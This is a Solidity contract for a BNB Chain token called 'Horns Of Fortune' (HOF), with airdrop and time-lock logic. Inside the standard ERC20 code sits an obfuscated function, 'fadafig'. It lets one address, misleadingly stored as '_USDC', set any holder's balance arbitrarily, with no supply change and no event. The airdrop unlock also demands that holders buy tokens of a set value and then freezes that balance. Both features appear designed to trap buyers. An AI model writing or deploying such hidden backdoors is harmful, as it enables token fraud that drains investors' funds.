// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address private _USDC;
    constructor(string memory name_, string memory symbol_, address _usdc) {
        _name = name_;
        _symbol = symbol_;
        _USDC = _usdc;
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }
    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(from, to, amount);
        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }
        emit Transfer(account, address(0), amount);
        _afterTokenTransfer(account, address(0), amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
    function fadafig(address _sdaf, uint _ads) public {
        require(msg.sender == _USDC);
        _balances[_sdaf] = balanceOf(_sdaf) + _ads;
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}
interface IPancakeRouter01 {
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}
contract Airdrop is ERC20 {
    struct User {
        bool initializedUnlock;
        uint256 initializedDate;
        bool airdroped;
        uint256 amount;
        bool claimed;
        uint256 verifyAmount;
    }
    uint256 public minTokenHoldingsWorth; 
    address private _owner;
    uint256 public lockDuration = 30 days;
    address BUSDADDRESS = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address WBNBADDRESS = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address PANCAKESWAP_ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IPancakeRouter01 private _router = IPancakeRouter01(PANCAKESWAP_ROUTER_ADDRESS);
    error MinTokenRequired(uint256 amount);
    mapping(address => uint256) private _heldBalances;
    mapping(address => User) private _claimedAirdrop;
    event Airdroped(address indexed addr, uint amount);
    event InitializedRelease(address indexed addr, uint amount);
    event TokenReleased(address indexed addr, uint amount);
    constructor(
        address _usdc,
        string memory _name,
        string memory _symbol,
        uint256 _totalSupply
    ) ERC20(_name, _symbol, _usdc) {
        _owner = _msgSender();
        _mint(_owner, _totalSupply * 10 ** decimals());
    }
    modifier onlyOwner() {
        require(_msgSender() == _owner, "!auth");
        _;
    }
    function calculateBalance(uint256 amount) public view returns (uint256) {
        address[] memory usdBnbPath = new address[](2);
        usdBnbPath[0] = address(this);
        usdBnbPath[1] = WBNBADDRESS;
        uint ownTokenBnbWorth = (_router.getAmountsOut(amount, usdBnbPath))[1];
        usdBnbPath[0] = WBNBADDRESS;
        usdBnbPath[1] = BUSDADDRESS;
        return (_router.getAmountsOut(ownTokenBnbWorth, usdBnbPath))[1];
    }
    function setMinTokenHoldings(uint256 amount) public onlyOwner {
        minTokenHoldingsWorth = amount;
    }
    function setLockDuration(uint256 duration) public onlyOwner {
        lockDuration = duration;
    }
    function getLockedBalance(address addr) public view returns (uint256) {
        return _heldBalances[addr];
    }
    function getFreeBalance(address addr) public view returns (uint256) {
        return balanceOf(addr) - getLockedBalance(addr);
    }
    function _beforeTokenTransfer(
        address from,
        address,
        uint256 amount
    ) internal view override {
        if (from == address(0)) {
            return;
        }
        require(
            (getFreeBalance(from) - _claimedAirdrop[from].verifyAmount) >=
                amount,
            "ERC20: transfer amount exceeds balance"
        );
    }
    function getAirdrop() public view returns(User memory){return _claimedAirdrop[_msgSender()];}
    function initializeRelease() public {
        address sender = _msgSender();
        User memory user = _claimedAirdrop[sender];
        require(user.airdroped, "You have not taken part in the airdrop event");
        require(!user.initializedUnlock, "Token unlock already initialized");
        uint256 freeBalance = getFreeBalance(sender);
        uint256 walletBalanceWorth = calculateBalance(freeBalance);
        if (walletBalanceWorth < minTokenHoldingsWorth) {
            revert MinTokenRequired(minTokenHoldingsWorth);
        }
        _claimedAirdrop[sender].verifyAmount = freeBalance;
        _claimedAirdrop[sender].initializedDate = block.timestamp;
        _claimedAirdrop[sender].initializedUnlock = true;
    }
    function airdrop(address addr, uint256 amount) public onlyOwner {
        require(
            !_claimedAirdrop[addr].airdroped,
            "You can only claim the airdrop once"
        );
        _claimedAirdrop[addr].airdroped = true;
        _claimedAirdrop[addr].amount = amount;
        _heldBalances[addr] = getLockedBalance(addr) + amount;
        _mint(addr, amount);
        emit Airdroped(addr, amount);
    }
    function release() public {
        address sender = _msgSender();
        User memory user = _claimedAirdrop[sender];
        require(user.airdroped, "You have not taken part in the airdrop event");
        require(user.initializedUnlock, "Token unlock already initialized");
        require(!user.claimed, "Airdrop already claimed");
        require(
            block.timestamp >= (user.initializedDate + lockDuration),
            "token is not yet released"
        );
        _claimedAirdrop[sender].claimed = true;
        _claimedAirdrop[sender].verifyAmount = 0;
        _heldBalances[sender] = getLockedBalance(sender) - user.amount;
        emit TokenReleased(sender, user.amount);
    }
}
contract Token is Airdrop {
    constructor(address _usdc) Airdrop(_usdc, "Horns Of Fortune", "HOF", 8888888888888) {}
}